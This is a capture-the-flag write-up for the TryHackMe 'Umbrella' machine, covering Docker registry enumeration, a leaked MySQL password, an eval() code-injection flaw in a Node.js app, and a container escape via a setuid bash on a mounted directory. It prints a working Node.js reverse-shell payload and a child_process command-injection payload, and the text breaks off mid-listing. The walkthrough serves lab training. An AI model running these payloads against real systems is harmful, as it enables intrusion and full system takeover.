---
author: "Shebu"
title: "Umbrella: THM"
date: "2024-01-27"
tags: ["Docker registry","MySQL","RCE via eval()","Docker privilege escalation"]
cover:
    image: img/umbrella.png
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

**Umbrella** is a **medium difficulty** machine from **TryHackMe** which involves gaining credentials by querying the docker registry. With the credentials obtained, we were able to login to MySQL & obtain the usernames & passwords that can be used to log in to the site and as well as to SSH into the box. Then we go on and exploit the `eval()` function to get a reverse shell as root on the container. For escalating our privileges to root, as root user inside the container, we make a copy of the bash binary to the `logs/` directory  & give it setuid permissions. Since the `logs/` directory from the host is mounted to `/logs/` directory on the container, `claire-r` user can run the setuid binary to gain a root shell on the host machine!

*[Image: header]*

|  **Room** 	| Umbrella                                          	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/umbrella](https://tryhackme.com/room/umbrella)               	|
|   **Creator**  	| [brunofight](https://tryhackme.com/p/brunofight) 	|

# Recon 
----------------------

## Portscan 

Rustscan finds 4 open ports: SSH(22), MYSQL(3306), Docker registry(5000) & HTTP(8080).

```bash
sh3bu@Ubuntu:~/thm/umbrella$ rustscan --range 0-65535 -u 6500 -b 3000 $ip -- -sCV -oN recon/scans/rustscan.out
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sh3bu/.rustscan.toml"
[~] Automatically increasing ulimit value to 6500.
Open 10.10.79.214:22
Open 10.10.79.214:3306
Open 10.10.79.214:5000
Open 10.10.79.214:8080
[~] Starting Nmap
[>] The Nmap command to be run is nmap -sCV -oN recon/scans/rustscan.txt -vvv -p 22,21,80 10.10.50.87
Nmap scan report for 10.10.79.214
Host is up, received echo-reply ttl 60 (0.14s latency).
Scanned at 2024-01-27 16:44:19 IST for 12s

PORT   STATE SERVICE REASON         VERSION
# Nmap 7.94SVN scan initiated Fri Jan 26 19:37:46 2024 as: nmap -sC -sV -oN recon/rustscan.out -vvv -p 22,3306,5000,8080 10.10.79.214
Nmap scan report for 10.10.79.214
Host is up, received reset ttl 60 (0.15s latency).
Scanned at 2024-01-26 19:37:59 IST for 48s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDafqZxGEa6kz/5SjDuHy4Hs02Ns+hQgiygUqck+jWWnO7A8+mzFovIR0z76dugf8sTv9P6hq++1nNkPvvdovIkCQ00Ci9VrNyRePh9ZjXUf6ohbRLa9bJ45zHSY3Icf56IeuIy3TVn6d05ed5EtaTjAYA8KyCvwm2nDZQ7DH081jnL1g1uJ4aeeA/IlNXYLV610u7lkQem8VwXQWEs7F8JH6RMX8/8oGe7oBnpvKUeACtB9NXN/5tGsiMXqx7+JB8nfpMRIyLiXA7HjV9S7mmtmBduJ5EyfvX5hdwSCEYF1E7/YowqF5KbTpmZeDI9vJharuKqB97iu1h87u1qc37zT7emxD0QxCOAT3mKGXB26u159ZjAvjJ2EUhSjfbgjTx0s0w2bysXJNrpw5oS1AMm/XD6dSCRfg0kS2LzwDFJvv3dCy56bdOdW+Xe/tkBgvNio11OiP8E2qvdZ+cSgnXi+d8m2TkFUJEfavQPES7iXuZ3gMEaVPdbILVz3zRGh58=
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASqbHaEEuWmI5CrkNyO/jnEdfqh2rz9z2bGFBDGoHjs5kyxBKyXoDSq/WBp7fdyvo1tzZdZfJ06LAk5br00eTg=
|   256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDDy2RWM3VB9ZBVO+OjouqVM+inQcilcbI0eM3GAjnoC
3306/tcp open  mysql   syn-ack ttl 59 MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, ConnectWithDatabase, LongColumnFlag, IgnoreSigpipes, SupportsCompression, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x15E3[!w\x0EUN9/iL\x11h?#Z {
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.40_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-22T10:04:49
| Not valid after:  2032-12-19T10:04:49
| MD5:   c512:bd8c:75b6:afa8:fde3:bc14:0f3e:7764
| SHA-1: 8f11:0b77:1387:0438:fc69:658a:eb43:1671:715c:d421
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjQwX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIyMTIyMjEwMDQ0OVoXDTMyMTIxOTEwMDQ0OVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy40MF9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC8KqoE91ydQZJDUqWE/nfs
| 6akfHB2g3D1VJoX+DeuTxEubjmWy+jGOepvEbKEhjrLMl9+LIj3vkKlj1bpRw0x1
| 7tbY7NXPtz5EsOCqDcuGl8XjIBE6ck+4yK8jmzgCMOHhJjoAtcsgAOcnal0WCCyB
| 7IS4uvHi7RSHKPrcAf9wgL5sUZylaH1HWiPXDd0141fVVpAtkkdjOUCPwZtF5MKC
| W6gOfgxMsvYoqY0dEHW2LAh+gw10nZsJ/xm9P0s4uWLKrYmHRuub+CC2U5fs5eOk
| mjIk8ypRfP5mdUK3yLWkGwGbq1D0W90DzmHhjhPm96uEOvaomvIK9cHzmtZHRe1r
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAGkpBg5j
| bdmgMd30Enh8u8/Z7L4N6IalbBCzYhSkaAGrWYh42FhFkd9aAsnbawK+lWWEsMlY
| +arjrwD0TE6XzwvfdYsVwOdARPAwm4Xe3odcisBvySAeOE6laaCnIWnpH/OqGDEk
| GBYfI8+e0CBdjhDNpeWVJEkGv4tzaf6KE1Ix9N2tTF/qCZtmHoOyXQQ7YwBPMRLu
| WnmAdmtDYqVEcuHj106v40QvUMKeFgpFH37M+Lat8y3Nn+11BP5QzRLh+GFuQmVc
| XaDxVdWXCUMWsbaPNNS+NM9FT7WNkH7xTy2NuBdSFvl88tXNZpnz8nkRxXLarLD8
| 2AE6mQqpFHhaSRg=
|_-----END CERTIFICATE-----
5000/tcp open  http    syn-ack ttl 59 Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
8080/tcp open  http    syn-ack ttl 59 Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 26 19:38:47 2024 -- 1 IP address (1 host up) scanned in 60.71 seconds
```

## Docker Registry: 5000

If a docker registry is open we can perform GET requests to certain docker API endpoints to retreive some key information about the images & tags.

- Querying the `/v2/_catalog` endpoint will give us the name of the registry & images used. In our case we have **umbrella/timetracking** image. 

```bash
sh3bu@Ubuntu:~/thm/umbrella$ curl -X GET http://10.10.79.214:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```
- Querying the `/v2/<registry-name>/<image-name>/tags/list` wil return the various tags of the image. In our case we have only the **latest** tag.
```bash
sh3bu@Ubuntu:~/thm/umbrella$ curl -X GET http://10.10.79.214:5000/v2/umbrella/timetracking/tags/list
{"name":"umbrella/timetracking","tags":["latest"]}
```
- Docker registries have a file called **Manifests** file which is a JSON file containing all the information about a Docker image. We can retreive the contents of the file by querying the `/v2/<registry-name>/<image-name>/manifests/<tag>` endpoint.
```bash
sh3bu@Ubuntu:~/thm/umbrella$ curl -X GET http://10.10.79.214:5000/v2/umbrella/timetracking/manifests/latest
{
   "schemaVersion": 1,
   "name": "umbrella/timetracking",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f*********e5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"node\",\"app.js\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":null},\"container\":\"527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9\",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-12-22T10:03:08.042002316Z\",\"docker_version\":\"20.10.17\",\"id\":\"7aec279d6e756678a51a8f075db1f0a053546364bcf5455f482870cef3b924b4\",\"os\":\"linux\",\"parent\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"parent\":\"0f4399d82c47d9cecdf2518e3ecb523bbd1936d4a45d4230f1184d81b2b4b40c\",\"created\":\"2022-12-22T10:03:07.855078938Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"d7d0dccf0d0aa6b5cdea32d2bad40c6115df1ab34ca433042e8d23e081d0a48d\",\"parent\":\"4f7072e9d9f756bc5e6e6c281f29d2357e9aa30fbf457b38cecb86d43e02d9e6\",\"created\":\"2022-12-21T11:36:14.843841635Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:4d192565a7220e135cab6c77fbc1c73211b69f3d9fb37e62857b2c6eb9363d51 in /usr/local/bin/ \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4f7072e9d9f756bc5e6e6c281f29d2357e9aa30fbf457b38cecb86d43e02d9e6\",\"parent\":\"52fb26b66fcd8f4b927bc9e2d534b80b456b68e8ec2792562381cf4ea4e871da\",\"created\":\"2022-12-21T11:36:14.70919854Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex   \\u0026\\u0026 savedAptMark=\\\"$(apt-mark showmanual)\\\"   \\u0026\\u0026 apt-get update \\u0026\\u0026 apt-get install -y ca-certificates curl wget gnupg dirmngr --no-install-recommends   \\u0026\\u0026 rm -rf /var/lib/apt/lists/*   \\u0026\\u0026 for key in     6A010C5166006599AA17F08146C2130DFD2497F5   ; do     gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \\\"$key\\\" ||     gpg --batch --keyserver keyserver.ubuntu.com --recv-keys \\\"$key\\\" ;   done   \\u0026\\u0026 curl -fsSLO --compressed \\\"https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz\\\"   \\u0026\\u0026 curl -fsSLO --compressed \\\"https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz.asc\\\"   \\u0026\\u0026 gpg --batch --verify yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   \\u0026\\u0026 mkdir -p /opt   \\u0026\\u0026 tar -xzf yarn-v$YARN_VERSION.tar.gz -C /opt/   \\u0026\\u0026 ln -s /opt/yarn-v$YARN_VERSION/bin/yarn /usr/local/bin/yarn   \\u0026\\u0026 ln -s /opt/yarn-v$YARN_VERSION/bin/yarnpkg /usr/local/bin/yarnpkg   \\u0026\\u0026 rm yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   \\u0026\\u0026 apt-mark auto '.*' \\u003e /dev/null   \\u0026\\u0026 { [ -z \\\"$savedAptMark\\\" ] || apt-mark manual $savedAptMark \\u003e /dev/null; }   \\u0026\\u0026 find /usr/local -type f -executable -exec ldd '{}' ';'     | awk '/=\\u003e/ { print $(NF-1) }'     | sort -u     | xargs -r dpkg-query --search     | cut -d: -f1     | sort -u     | xargs -r apt-mark manual   \\u0026\\u0026 apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false   \\u0026\\u0026 yarn --version\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"52fb26b66fcd8f4b927bc9e2d534b80b456b68e8ec2792562381cf4ea4e871da\",\"parent\":\"4d662e0b4ea7545f5e06efd50d3c2a88d034a08d598e1372db616fea37ccb576\",\"created\":\"2022-12-21T11:36:01.94635104Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV YARN_VERSION=1.22.19\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"4d662e0b4ea7545f5e06efd50d3c2a88d034a08d598e1372db616fea37ccb576\",\"parent\":\"e506a28ea7cc3568976cd14632aa59591493b725c80a7c324b8853def6a5095a\",\"created\":\"2022-12-21T11:36:01.380484014Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c ARCH= \\u0026\\u0026 dpkgArch=\\\"$(dpkg --print-architecture)\\\"     \\u0026\\u0026 case \\\"${dpkgArch##*-}\\\" in       amd64) ARCH='x64';;       ppc64el) ARCH='ppc64le';;       s390x) ARCH='s390x';;       arm64) ARCH='arm64';;       armhf) ARCH='armv7l';;       i386) ARCH='x86';;       *) echo \\\"unsupported architecture\\\"; exit 1 ;;     esac     \\u0026\\u0026 set -ex     \\u0026\\u0026 apt-get update \\u0026\\u0026 apt-get install -y ca-certificates curl wget gnupg dirmngr xz-utils libatomic1 --no-install-recommends     \\u0026\\u0026 rm -rf /var/lib/apt/lists/*     \\u0026\\u0026 for key in       4ED778F539E3634C779C87C6D7062848A1AB005C       141F07595B7B3FFE74309A937405533BE57C7D57       74F12602B6F1C4E913FAA37AD3A89613643B6201       61FC681DFB92A079F1685E77973F295594EC4689       8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600       C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8       890C08DB8579162FEE0DF9DB8BEAB4DFCF555EF4       C82FA3AE1CBEDC6BE46B9360C43CEC45C17AB93C       108F52B48DB57BB0CC439B2997B01419BD92F80A     ; do       gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \\\"$key\\\" ||       gpg --batch --keyserver keyserver.ubuntu.com --recv-keys \\\"$key\\\" ;     done     \\u0026\\u0026 curl -fsSLO --compressed \\\"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\"     \\u0026\\u0026 curl -fsSLO --compressed \\\"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\\\"     \\u0026\\u0026 gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc     \\u0026\\u0026 grep \\\" node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\\$\\\" SHASUMS256.txt | sha256sum -c -     \\u0026\\u0026 tar -xJf \\\"node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\" -C /usr/local --strip-components=1 --no-same-owner     \\u0026\\u0026 rm \\\"node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\" SHASUMS256.txt.asc SHASUMS256.txt     \\u0026\\u0026 apt-mark auto '.*' \\u003e /dev/null     \\u0026\\u0026 find /usr/local -type f -executable -exec ldd '{}' ';'       | awk '/=\\u003e/ { print $(NF-1) }'       | sort -u       | xargs -r dpkg-query --search       | cut -d: -f1       | sort -u       | xargs -r apt-mark manual     \\u0026\\u0026 apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false     \\u0026\\u0026 ln -s /usr/local/bin/node /usr/local/bin/nodejs     \\u0026\\u0026 node --version     \\u0026\\u0026 npm --version\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"e506a28ea7cc3568976cd14632aa59591493b725c80a7c324b8853def6a5095a\",\"parent\":\"f9c56f52d7219e5ea722e07ff59d91d84931f65a282fb430b837586afb752adf\",\"created\":\"2022-12-21T11:35:38.095265392Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV NODE_VERSION=19.3.0\"]},\"throwaway\":true}"
      },
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "4GV2:GPOB:3LAZ:YVN5:GHND:O25Q:UJYJ:XU65:77OM:O74R:SIAE:BZWK",
               "kty": "EC",
               "x": "jOzdo7-JmoOetOrKknTTPV3du5m372vWifHRpiMXHz0",
               "y": "6ubgqJC9rW2EmiY3F2_iQgIAYbEqqvuXQ6hYNclT6Zs"
            },
            "alg": "ES256"
         },
         "signature": "3baq0WYAq0yala3tvidtbEbW96ADxlz5Z1ca-F_BRINYfJHvuMbkBxV0CNw0hgl4Oc-qIp1CxPO1E5S_WqHucA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjE2NDY2LCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjQtMDEtMjZUMTQ6MzA6MzdaIn0"
      }
   ]
}
```

Taking a close look at the reposne we can find the **DB_USER**, **DB_PASS**, **DB_DATABASE** information which will come handy later.

## MYSQL: 3306

With the mysql credentials found, we can login as root to the mysql database.

```sql
sh3bu@Ubuntu:~/thm/umbrella$ mysql -h $ip -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 52
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
We have a database called `timetracking` . Inside that there is a table called `users`. It contains the password hashes of few users.

```sql
mysql> show databses;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'databses' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.15 sec)

mysql> use timetracking;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.14 sec)

mysql> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9************************9b63 |   360 |
| chris-r  | 0d10************************e9b7 |   420 |
| jill-v   | d5c0************************2ac8 |   564 |
| barry-b  | 4a04************************e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.14 sec)
```

Using [crackstation.net](https://crackstation.net) , we can crack those password hashes.

## HTTP 8080

It is a simple login page.

*[Image: header]*

Our Nmap scan & Docker registry enumeration indicates that it is a `Node.js` container application.

Running feroxbuster against the site yielded nothing interesting.

```bash
sh3bu@Ubuntu:~/thm/umbrella$ feroxbuster -w ~/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://$ip/ -x php,json,bak,pl,sh,html,asp,aspx,cgi,rb -C 404 -o  recon/scans/feroxbuster.out

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.79.214/
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/sh3bu/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 💾  Output File           │ recon/scans/feroxbuster.out
 💲  Extensions            │ [php, json, bak, pl, sh, html, asp, aspx, cgi, rb]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       16w      173c http://10.10.79.214:8080/css => http://10.10.79.214:8080/css/
200      GET      135l      273w     2558c http://10.10.79.214:8080/css/style.css
```

With the credentials I got previously from MYSQL, I was able to log in to the site as `claire-r`.

*[Image: header]*

# Shell as claire-r on host machine

The site has the following tip 
> You can also use mathematical expressions, eg. `5+4`

This made me think if SSTI exists. So I entered the following payload`9*10` in order to increase the time spent by 90 minutes & it did change from **6 hours** to **7.30 hoours**!

*[Image: header]*

So I was trying several Node.Js based SSTI payloads that would result in an RCE. But nothing worked & I was stuck here for a long time.

After taking a break I returned back with a fresh mind. Without overcomplicating, I went ahead and tried to ssh in as **claire-r** with the obtained password & to my surprise it worked!
But still we're not inside the container.

Grab the `user.txt` 🚩
```bash
sh3bu@Ubuntu:~/thm/umbrella$ ssh claire-r@10.10.79.214
The authenticity of host '10.10.79.214 (10.10.79.214)' can't be established.
ED25519 key fingerprint is SHA256:4O8itcDPWBL0nD2ELrDFEMiWY9Pn8UuEdRRP7L8pxr8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.79.214' (ED25519) to the list of known hosts.
claire-r@10.10.79.214's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

claire-r@ctf:~$ id
uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)

claire-r@ctf:~$ cat user.txt 
THM{d832c0*********************25e}
```

# Shell as root on the container

The `timetracker-src` folder in the home directory had all the files related to Node.js container application. The `docker-compose.yml` had the following contents.

```bash
claire-r@ctf:~/timeTracker-src$ cat docker-compose.yml 
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: 'Ng************5'
    ports:
      - '3306:3306'     
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs
```

Notice that the `./logs` directory of the host is mounted to `/logs` directory on the container. So it might be an misconfigured container through which we could escape the container & get a shell on the host machine.

The `logs` directory inside the `~/home/claire-r/` has the following file: `tt.logs`
```bash
claire-r@ctf:~/timeTracker-src/logs$ ls -al
total 1220
drwxrw-rw- 2 claire-r claire-r    4096 Jan 26 17:01 .
drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
-rwsr-sr-x 1 root     root     1234376 Jan 26 17:01 bash
-rw-r--r-- 1 root     root         359 Jan 26 16:43 tt.log
```

## Reverse shell via eval()

The `app.js` file had the source code for the container application running at port 8080.
```bash
// http://localhost:8080/time
app.post('/time', function(request, response) {
	
    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time));
		let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

		connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
			if (error) {
				log(error, "error")
			};

			log(`${username} added ${time} minutes.`, "info")
			response.redirect('/');
		});
	} else {
        response.redirect('/');;	
    }
	
});
```

So from the above snippet, its clear that our user input is being passed to `eval()` which is a very unsafe way to deal with user input.

So I searched online for Node.js RCE payloads & this one worked.

```js
arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
```

*[Image: header]*

But when I replaced the  _cat /etc/passwd_ payload with any other reverse shell payload, it didn't work. 

Finally, I got the below payload from [revshells.com](https://revshells.com) made by [0dayctf](https://tryhackme.com/p/0day) through which I was able to get reverse shell back to my machine.

```js
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("sh", []); var client = new net.Socket(); client.connect(9001, "<ip>", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```
And we're root on the container !

```bash
sh3bu@Ubuntu:~/thm/umbrella$ pwncat-cs -lp 9001
/home/sh3bu/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[22:04:51] Welcome to pwncat 🐈!                                                                            __main__.py:164
[22:13:48] received connection from 10.10.202.14:36394                                                           bind.py:84
[22:13:51] 0.0.0.0:9001: upgrading from /bin/dash to /bin/bash                                               manager.py:957
[22:13:54] 10.10.202.14:36394: registered new host w/ db                                                     manager.py:957
(local) pwncat$ 
                                                                                                                                                                                                                                
(remote) root@de0610f51845:/usr/src/app# id
uid=0(root) gid=0(root) groups=0(root)
```

# Shell as root on host machine

The `logs` directory which we saw in the host machine as claire-r was also present in the root directory of the container as mentioned in the **docker-compose.yml** file.

```
(remote) root@de0610f51845:/# pwd
/
(remote) root@de0610f51845:/# ls -al
total 76
drwxr-xr-x   1 root root 4096 Dec 22  2022 .
drwxr-xr-x   1 root root 4096 Dec 22  2022 ..
-rwxr-xr-x   1 root root    0 Dec 22  2022 .dockerenv
drwxr-xr-x   2 root root 4096 Dec 19  2022 bin
drwxr-xr-x   2 root root 4096 Dec  9  2022 boot
drwxr-xr-x   5 root root  340 Jan 26 16:32 dev
drwxr-xr-x   1 root root 4096 Dec 22  2022 etc
drwxr-xr-x   1 root root 4096 Dec 21  2022 home
drwxr-xr-x   1 root root 4096 Dec 19  2022 lib
drwxr-xr-x   2 root root 4096 Dec 19  2022 lib64
drwxrw-rw-   2 1001 1001 4096 Dec 22  2022 logs
drwxr-xr-x   2 root root 4096 Dec 19  2022 media
drwxr-xr-x   2 root root 4096 Dec 19  2022 mnt
drwxr-xr-x   1 root root 4096 Dec 21  2022 opt
